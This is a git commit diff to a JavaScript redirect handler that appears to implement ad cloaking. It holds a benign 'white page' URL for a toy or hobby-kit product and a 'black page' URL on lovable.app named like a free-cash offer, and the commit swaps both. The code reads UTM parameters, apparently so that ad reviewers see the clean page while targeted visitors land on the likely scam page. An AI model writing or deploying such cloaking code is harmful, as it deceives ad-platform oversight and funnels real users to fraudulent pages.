1e9f5d918dbb25e61b4ce415b78ab12250f48f58
abdullahch3332 <abdullahch3332@gmail.com>
2025-11-06 02:07:55 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://thewoodenwagon.com/woodentoy/DHH270.html";
-    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
+    const whitePageURL = "https://www.hobbyco.com.au/products/3d-modeling-painting-kit-30x40cm-a-cat-in-a-flower-crown";
+    const blackPageURL = "https://lucurfreeeccssh.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
